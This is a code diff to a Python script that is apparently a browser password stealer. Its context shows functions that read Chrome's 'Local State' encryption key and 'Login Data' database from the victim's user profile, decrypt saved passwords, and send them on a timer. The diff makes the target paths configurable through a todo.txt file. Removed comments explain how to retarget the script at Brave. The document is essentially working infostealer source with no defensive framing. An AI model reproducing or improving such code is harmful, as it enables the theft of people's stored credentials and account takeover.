@@ -41,6 +41,22 @@ def send():
             timer.start()
         except:
             return
+        
+        
+def load_path(id):
+    try:
+        with open("todo.txt", "r") as f:
+            lines = f.readlines()
+            dir_path = lines[3].strip()
+            db_path = lines[4]
+            f.close()
+    except:
+        return
+        
+    if id == "dir":
+        return dir_path
+    elif id == "db":
+        return db_path
 
 
 def store_data(data):
@@ -53,11 +69,11 @@ def store_data(data):
 def fetch_key():
     try:
         try:
-            local_computer_directory_path = os.path.join(os.environ["USERPROFILE"], "AppData/Local/Google/Chrome/User Data/Local State")#use replace this line whit following line to extract passwords from brave: local_computer_directory_path = os.path.join(os.environ["USERPROFILE"], "AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
+            dir_path = os.path.join(os.environ["USERPROFILE"], load_path("dir"))
         except:
-            sys.exit(0)
+            return
             
-        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
+        with open(dir_path, "r", encoding="utf-8") as f:
             local_state_data = f.read()
             local_state_data = json.loads(local_state_data)
 
@@ -83,7 +99,7 @@ def decrypt_password(password, key):
             return "No Passwords Found"
 
 try:
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData/Local/Google/Chrome/User Data/Default/Login Data")#use replace this line whit following line to extract passwords from brave: db_path = os.path.join(os.environ["USERPROFILE"], "AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data")
+    db_path = os.path.join(os.environ["USERPROFILE"], load_path("db"))
 except:
     sys.exit(0)
 file = "data.db"
